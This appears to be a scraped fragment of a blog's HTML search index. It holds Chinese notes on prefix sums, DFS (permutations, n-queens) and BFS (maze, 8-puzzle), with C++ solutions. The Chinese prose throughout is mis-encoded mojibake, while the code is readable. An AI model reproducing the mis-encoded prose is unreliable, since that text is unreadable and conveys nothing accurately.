mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;P[j] \bmod k == P[i-1] \bmod k&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå°±å¯ä»¥ä¿è¯ä¸Šé¢çš„ç­‰å¼æˆç«‹ã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘å¯¹æ•°ç»„è¿›è¡Œéå†ï¼Œåœ¨éå†åŒæ—¶ç»Ÿè®¡ç­”æ¡ˆã€‚å½“æˆ‘ä»¬éå†åˆ°ç¬¬ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.65952em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; ä¸ªå…ƒç´ æ—¶ï¼Œæˆ‘ä»¬ç»Ÿè®¡ä»¥ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.65952em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; ç»“å°¾çš„ç¬¦åˆæ¡ä»¶çš„å­æ•°ç»„ä¸ªæ•°ã€‚æˆ‘ä»¬å¯ä»¥ç»´æŠ¤ä¸€ä¸ªä»¥å‰ç¼€å’Œæ¨¡ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; çš„å€¼ä¸ºé”®ï¼Œå‡ºç°æ¬¡æ•°ä¸ºå€¼çš„å“ˆå¸Œè¡¨ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;record&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\textit{record}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;record&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œåœ¨éå†çš„åŒæ—¶è¿›è¡Œæ›´æ–°ã€‚è¿™æ ·åœ¨è®¡ç®—ä»¥ i ç»“å°¾çš„ç¬¦åˆæ¡ä»¶çš„å­æ•°ç»„ä¸ªæ•°æ—¶ï¼Œæ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œç­”æ¡ˆå³ä¸º &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;0..&lt;/mn&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[0..i-1]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; ä¸­å‰ç¼€å’Œæ¨¡ k ä¹Ÿä¸º &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;P[i] \bmod k&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; çš„ä½ç½®ä¸ªæ•°ï¼Œå³ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;record&lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\textit{record}[P[i] \bmod k]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;record&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int subarraysDivByK(vector&amp;lt;int&amp;gt;&amp;amp; nums, int k) {
        unordered_map&amp;lt;int, int&amp;gt; record = {{0, 1}};
        int sum = 0, ans = 0;
        for (int elem: nums) {
            sum += elem;
            // æ³¨æ„ C++ å–æ¨¡çš„ç‰¹æ®Šæ€§ï¼Œå½“è¢«é™¤æ•°ä¸ºè´Ÿæ•°æ—¶å–æ¨¡ç»“æœä¸ºè´Ÿæ•°ï¼Œéœ€è¦çº æ­£
            int modulus = (sum % k + k) % k;
            if (record.count(modulus)) {
                ans += record[modulus];
            }
            ++record[modulus];
        }
        return ans;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/find-the-longest-substring-containing-vowels-in-even-counts/&#34;&gt;æ¯ä¸ªå…ƒéŸ³åŒ…å«å¶æ•°æ¬¡çš„æœ€é•¿å­å­—ç¬¦ä¸²&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/number-of-wonderful-substrings/&#34;&gt;æœ€ç¾å­å­—ç¬¦ä¸²çš„æ•°ç›®&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
">ã€ç®—æ³•ã€‘å‰ç¼€å’Œ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-sou-suo-yu-tu-lun/"" data-c="
          &lt;h1 id=&#34;æœç´¢&#34;&gt;æœç´¢&lt;/h1&gt;
&lt;h2 id=&#34;dfs&#34;&gt;DFS&lt;/h2&gt;
&lt;p&gt;ä¼˜ç¼ºç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å®¹æ˜“çˆ†æ ˆï¼Œå¦‚æœæœ‰1e4å±‚å°±çˆ†äº†ã€‚&lt;/li&gt;
&lt;li&gt;ç©ºé—´å’Œæ·±åº¦æˆæ­£æ¯”ï¼Œç›¸å¯¹è¾ƒå°&lt;/li&gt;
&lt;li&gt;ä¸èƒ½æœæœ€çŸ­ã€æœ€å°&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ’åˆ—æ•°å­—&#34;&gt;æ’åˆ—æ•°å­—&lt;/h3&gt;
&lt;p&gt;ç»™å®šä¸€ä¸ªæ•´æ•° nï¼Œå°†æ•°å­— 1âˆ¼n æ’æˆä¸€æ’ï¼Œå°†ä¼šæœ‰å¾ˆå¤šç§æ’åˆ—æ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨ï¼Œè¯·ä½ æŒ‰ç…§å­—å…¸åºå°†æ‰€æœ‰çš„æ’åˆ—æ–¹æ³•è¾“å‡ºã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;vector&amp;gt;

using namespace std;

int n;
int use[10] = {0};

void dfs(vector&amp;lt;int&amp;gt; res)
{
    if(res.size()==n)
    {
        for(int i = 0; i &amp;lt; n; i ++)
            cout &amp;lt;&amp;lt; res[i] &amp;lt;&amp;lt;&amp;quot; &amp;quot;;
        cout &amp;lt;&amp;lt; endl;
        return;
    }
    for(int i = 1; i &amp;lt;= n; i ++)
        if(!use[i])
        {
            use[i] = 1;
            res.push_back(i);
            dfs(res);
            res.pop_back();
            use[i] = 0;
        }
}

int main()
{
    vector&amp;lt;int&amp;gt; res;
    cin &amp;gt;&amp;gt; n;
    dfs(res);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;n-çš‡åé—®é¢˜&#34;&gt;n-çš‡åé—®é¢˜&lt;/h3&gt;
&lt;p&gt;nâˆ’çš‡åé—®é¢˜æ˜¯æŒ‡å°† n ä¸ªçš‡åæ”¾åœ¨ nÃ—n çš„å›½é™…è±¡æ£‹æ£‹ç›˜ä¸Šï¼Œä½¿å¾—çš‡åä¸èƒ½ç›¸äº’æ”»å‡»åˆ°ï¼Œå³ä»»æ„ä¸¤ä¸ªçš‡åéƒ½ä¸èƒ½å¤„äºåŒä¸€è¡Œã€åŒä¸€åˆ—æˆ–åŒä¸€æ–œçº¿ä¸Šã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨ç»™å®šæ•´æ•° nï¼Œè¯·ä½ è¾“å‡ºæ‰€æœ‰çš„æ»¡è¶³æ¡ä»¶çš„æ£‹å­æ‘†æ³•ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;è¾“å…¥æ ·ä¾‹ï¼š
4
è¾“å‡ºæ ·ä¾‹ï¼š
.Q..
...Q
Q...
..Q.

..Q.
Q...
...Q
.Q..
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;iostream&amp;gt;

using namespace std;

const int N = 20;
char map[N][N];
// æ ‡è®°è¯¥ç‚¹å¯¹åº”çš„åˆ—ã€æ–œçº¿ã€åæ–œçº¿æ˜¯å¦æœ‰çš‡åï¼Œä»å·¦ä¸‹åˆ°å³ä¸Šå¯¹åº”slash[1~15]ï¼Œä»å·¦ä¸Šåˆ°å³ä¸‹å¯¹åº”backslash[1~15]
bool col[N], slash[N*2], backslash[N*2]; 
int n;

void dfs(int row)
{
    if(row == n + 1)
    {
        for(int i = 1; i &amp;lt;= n; i ++)
        {
            for(int j = 1; j &amp;lt;= n; j ++)
                cout &amp;lt;&amp;lt; map[i][j];
            cout &amp;lt;&amp;lt; endl;
        }
        cout &amp;lt;&amp;lt; endl;
    }
    for(int j = 1; j &amp;lt;= n; j ++)
    {
        if(!col[j] &amp;amp;&amp;amp; !slash[j - row + n] &amp;amp;&amp;amp; !backslash[j + row -1])
        {
            map[row][j] = &#39;Q&#39;;
            col[j] = slash[j - row + n] = backslash[j + row - 1] = true;
            dfs(row + 1);
            map[row][j] = &#39;.&#39;;
            col[j] = slash[j - row + n] = backslash[j + row - 1] = false;
        }
    }
}

int main()
{
    cin &amp;gt;&amp;gt; n;
    for(int i = 1; i &amp;lt;= n; i++)
        for(int j = 1; j &amp;lt;= n; j++)
            map[i][j] = &#39;.&#39;;
    dfs(1);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;bfs&#34;&gt;BFS&lt;/h2&gt;
&lt;p&gt;ä¼˜ç¼ºç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç©ºé—´çš„æŒ‡æ•°çº§åˆ«å¤§&lt;/li&gt;
&lt;li&gt;ä¸ä¼šæœ‰çˆ†æ ˆçš„é£é™©&lt;/li&gt;
&lt;li&gt;å¯ä»¥æœæœ€çŸ­ã€æœ€å°&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;èµ°è¿·å®«&#34;&gt;èµ°è¿·å®«&lt;/h3&gt;
&lt;p&gt;ç»™å®šä¸€ä¸ª nÃ—m çš„äºŒç»´æ•´æ•°æ•°ç»„ï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªè¿·å®«ï¼Œæ•°ç»„ä¸­åªåŒ…å« 0 æˆ– 1ï¼Œå…¶ä¸­ 0 è¡¨ç¤ºå¯ä»¥èµ°çš„è·¯ï¼Œ1 è¡¨ç¤ºä¸å¯é€šè¿‡çš„å¢™å£ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åˆï¼Œæœ‰ä¸€ä¸ªäººä½äºå·¦ä¸Šè§’ (1,1) å¤„ï¼Œå·²çŸ¥è¯¥äººæ¯æ¬¡å¯ä»¥å‘ä¸Šã€ä¸‹ã€å·¦ã€å³ä»»æ„ä¸€ä¸ªæ–¹å‘ç§»åŠ¨ä¸€ä¸ªä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;è¯·é—®ï¼Œè¯¥äººä»å·¦ä¸Šè§’ç§»åŠ¨è‡³å³ä¸‹è§’ (n,m) å¤„ï¼Œè‡³å°‘éœ€è¦ç§»åŠ¨å¤šå°‘æ¬¡ã€‚&lt;/p&gt;
&lt;p&gt;æ•°æ®ä¿è¯ (1,1) å¤„å’Œ (n,m) å¤„çš„æ•°å­—ä¸º 0ï¼Œä¸”ä¸€å®šè‡³å°‘å­˜åœ¨ä¸€æ¡é€šè·¯ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;queue&amp;gt;

using namespace std;

int main()
{
    int n, m;
    bool map[101][101];
    int dir[4][2] = {{-1, 0}, {1, 0}, {0, 1}, {0, -1}};
    int dis[101][101];
    queue&amp;lt;pair&amp;lt;int, int&amp;gt; &amp;gt; q;
    
    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
    for(int i = 1; i &amp;lt;= n; i ++)
        for(int j = 1; j &amp;lt;= m; j++)
        {
            cin &amp;gt;&amp;gt; map[i][j];
            dis[i][j] = -1;
        }
    dis[1][1] = 0;
    q.push({1, 1});
    
    while(!q.empty())
    {
        int x = q.front().first;
        int y = q.front().second;
        q.pop();
        
        for(int i = 0; i &amp;lt; 4; i++)
        {
            int nextx = x + dir[i][0];
            int nexty = y + dir[i][1];
            if(nextx&amp;gt;=1 &amp;amp;&amp;amp; nextx&amp;lt;=n &amp;amp;&amp;amp; nexty&amp;gt;=1 &amp;amp;&amp;amp; nexty&amp;lt;=m &amp;amp;&amp;amp; map[nextx][nexty]==0 &amp;amp;&amp;amp; dis[nextx][nexty] == -1)
            {
                q.push({nextx, nexty});
                dis[nextx][nexty] = dis[x][y] + 1;
            }
        }
    }
    cout &amp;lt;&amp;lt; dis[n][m];
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;æ•°å­—åå®¹é“&#34;&gt;æ•°å­—åå®¹é“&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;queue&amp;gt;
#include &amp;lt;unordered_map&amp;gt;

using namespace std;

int main()
{
    string start;
    string tmp;
    queue&amp;lt;string&amp;gt; q;
    unordered_map&amp;lt;string, int&amp;gt; d;
    
    string ans = &amp;quot;12345678x&amp;quot;;
    
    int dx[] = {-1, 0, 1, 0}, dy[] = {0, -1, 0, 1};
    
    for(int i = 0; i &amp;lt; 9; i ++)
    {
        cin &amp;gt;&amp;gt; tmp;
        start += tmp;
    }
    
    // cout &amp;lt;&amp;lt; start &amp;lt;&amp;lt; endl;
    
    q.push(start);
    d[start] = 0;
    
    
    while(!q.empty())
    {
        string str = q.front();
        q.pop();
        int dis = d[str];
        
        int k = str.find(&#39;x&#39;);
        int x = k / 3, y = k % 3;
        
        for(int i = 0; i &amp;lt; 4; i ++)
        {
            int nx = x + dx[i], ny = y + dy[i];
            if(nx &amp;gt;= 0 &amp;amp;&amp;amp; nx &amp;lt; 3 &amp;amp;&amp;amp; ny &amp;gt;= 0 &amp;amp;&amp;amp; ny &amp;lt; 3)
            {
                swap(str[nx * 3 + ny], str[k]);
                if(str == ans) 
                {
                    cout &amp;lt;&amp;lt; dis + 1 &amp;lt;&amp;lt; endl;
                    return 0;
                }
                
                if(d.find(str) == d.end())
                {
                    q.push(str);
                    d[str] = dis + 1;
                }
                    
                swap(str[nx * 3 + ny], str[k]);
            }
            
        }
        
    }
    cout &amp;lt;&amp;lt; -1 &amp;lt;&amp;lt;endl;
    return 0;
    
}
&lt;/code&gt;&lt;/pre&gt;
">ã€ç®—æ³•ã€‘æœç´¢ä¸å›¾è®º</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/wei-yun-suan/"" data-c="
          &lt;h2 id=&#34;åº”ç”¨&#34;&gt;åº”ç”¨&lt;/h2&gt;
